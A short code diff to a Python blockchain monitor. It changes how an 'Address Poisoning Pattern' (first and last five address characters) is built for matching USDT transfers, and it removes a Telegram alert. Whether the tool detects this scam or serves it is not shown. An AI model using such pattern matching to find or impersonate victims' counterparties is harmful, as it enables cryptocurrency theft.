@@ -5,7 +5,6 @@ import json
 from decimal import Decimal
 from datetime import datetime
 from base_agent import BaseAgent
-from telegram_bot import send_alert
 
 class MonitorAgent(BaseAgent):
     def __init__(self):
@@ -36,7 +35,9 @@ class MonitorAgent(BaseAgent):
             return False
 
     def get_pattern(self, address):
-        return f"{address[1:5]}*{address[-5:]}"
+        # Module 4: Address Poisoning Pattern (1st 5 and Last 5)
+        # Example: TLaGj...GYitv -> TLaGj*GYitv
+        return f"{address[:5]}*{address[-5:]}"
 
     def process_event(self, event):
         try:
@@ -77,7 +78,6 @@ class MonitorAgent(BaseAgent):
                     self.log(f"MATCH FOUND: {sender} | {value} USDT")
                     self.r.lpush("match_history", json.dumps(match_data))
                     self.r.ltrim("match_history", 0, 99)
-                    send_alert(f"Match: {value} USDT from {sender}", pattern)
         except Exception as e:
             self.log(f"Event Error: {e}", "error")
 
